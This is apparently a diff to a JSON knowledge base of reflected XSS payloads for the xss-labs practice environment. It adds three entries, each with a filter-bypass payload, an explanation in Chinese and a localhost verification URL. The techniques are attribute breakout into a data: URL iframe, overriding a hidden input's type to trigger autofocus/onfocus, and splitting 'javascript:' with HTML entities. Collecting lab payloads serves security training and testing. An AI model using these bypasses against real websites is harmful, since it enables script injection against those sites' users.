@@ -217,5 +217,29 @@
     "principle": "无引号属性值区用空格分隔注入事件属性；< > \" 被实体编码但空格保留，直接在 embed 上挂 onmouseover（verify 工具自动 hover 触发）",
     "source": "xss-labs level18",
     "verify_url": "http://localhost:8080/level18.php?arg01=AAA&arg02=BBB onmouseover=alert({payload})"
+  },
+  {
+    "id": "auto-20261015021940",
+    "context": "反射型。keyword 参数反射进 <input name=keyword value=\"...\"> 双引号属性内；引号未实体编码可闭合，但服务端过滤/替换 <script> 和 on* 事件属性；<> 与引号原样输出",
+    "reference_payload": "\"><iframe src=\"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E\">",
+    "principle": "属性 breakout + data: URL iframe 绕过 script/on 关键字过滤",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level5.php?keyword=%22%3E%3Ciframe%20src%3D%22data%3Atext%2Fhtml%2C%253Cscript%253Ealert(1)%253C%2Fscript%253E%22%3E&submit=search"
+  },
+  {
+    "id": "auto-20261015023750",
+    "context": "反射型：输入反射进 <input type=\"hidden\" value=\"t_sort反射\"> 的双引号属性内，引号未编码可 breakout，但 type=hidden 导致 onfocus/onmouseover 等事件永不触发",
+    "reference_payload": "\" type=\"text\" autofocus onfocus=alert(1) x=\"",
+    "principle": "hidden 输入框内属性 breakout 后先覆写 type 为可聚焦元素（text），再挂 autofocus+onfocus，无需交互即触发",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level10.php?keyword=test&t_link=1&t_history=2&t_sort={payload}"
+  },
+  {
+    "id": "auto-20261015024131",
+    "context": "反射型；输入回显进 <a href=\"...\"> 属性值，输入被 strtolower 小写化，且 str_replace 把 `script`→`scr_ipt`、`on`→`o_n`；`&`/`#` 未过滤但需 URL 编码才能进服务端",
+    "reference_payload": "java%26%23115%3Bcript:alert(1)",
+    "principle": "href 内 javascript: 协议的 script 关键字被替换破坏，用 HTML 十进制实体 &#115; 代表 s 拆开关键字（&#115;→s），绕过 str_replace；`&` `#` 需 URL 编码 %26 %23 才能到达服务端（# 否则被当 fragment）。点击链接触发。",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level8.php?keyword=java%26%23115%3Bcript:alert(1)"
   }
 ]
